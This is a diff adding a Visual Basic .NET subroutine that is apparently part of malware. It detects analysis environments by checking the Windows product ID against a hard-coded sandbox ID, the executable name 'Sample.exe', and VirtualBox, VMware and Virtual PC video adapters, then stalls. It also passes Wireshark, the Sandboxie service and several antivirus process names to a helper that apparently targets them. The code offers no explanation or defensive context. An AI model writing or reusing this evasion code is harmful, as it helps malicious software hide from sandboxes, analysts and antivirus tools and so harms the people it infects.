@@ -1,0 +1,59 @@
+Shared Sub AT
+		Dim id As String = "76487-337-8429955-22614"
+		
+        Dim regPID As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion", False)
+        
+        Dim pid As Object = regPID.GetValue("ProductId")
+        
+        Dim D As Object, R As String = Nothing, B As String = "SELECT * FROM Win32_VideoController"
+        
+        D = GetObject("winmgmts:").ExecQuery(B)
+        
+        Dim AdaptList As Object
+        
+        For Each AdaptList In D
+        
+            R = AdaptList.Description
+        
+        Next
+		
+		If System.Windows.Forms.Application.ExecutablePath = System.Windows.Forms.Application.StartupPath & "\Sample.exe" Then
+        
+            System.Threading.Thread.Sleep(10000)
+       
+        End If
+        
+        If pid = id Then
+        
+                System.Threading.Thread.Sleep(10000)
+                
+        End If
+        
+        A("wireshark")
+        
+        Select Case R
+        
+             Case "VM Additions S3 Trio32/64"
+             
+                System.Threading.Thread.Sleep(10000)
+                
+             Case "VirtualBox Graphics Adapter"
+                
+                System.Threading.Thread.Sleep(10000)
+                
+             Case "VMware SVGA II"
+             
+                System.Threading.Thread.Sleep(10000)
+                
+        End Select
+        
+        A("SbieSvc")
+        
+        A("avp")
+        
+        A("avgnt")
+        
+        A("ashServ")
+        
+        A("avgtray")
+ End Sub
